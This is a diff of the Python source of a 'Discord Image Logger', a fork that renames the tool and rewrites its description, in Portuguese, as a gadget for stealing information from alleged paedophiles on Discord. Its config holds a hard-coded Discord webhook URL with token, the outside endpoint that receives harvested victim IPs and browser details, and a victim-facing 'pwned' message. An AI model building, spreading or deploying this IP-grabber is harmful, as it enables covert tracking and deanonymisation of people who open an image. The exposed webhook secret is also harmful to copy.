@@ -2,10 +2,10 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "DeKrypt"
+__app__ = "Image Logger, Apenas."
+__description__ = "Apenas um bagulhete para roubar informações de pedo do discord"
+__version__ = "v1.0"
+__author__ = "MrDark"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1401030435500327123/Y-fH4HrinvHlJn4QOoTpkl446A-XspptlmOskYUXpzSR1txYfesXVhuxF9X--uGQfAMv",
@@ -19,7 +19,7 @@ config = {
 
     "message": { 
         "doMessage": False, 
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", 
+        "message": "Mas um pedo pego pelo MrDark. https://github.com/MrDark-spec/home", 
         "richMessage": True, 
     },
 
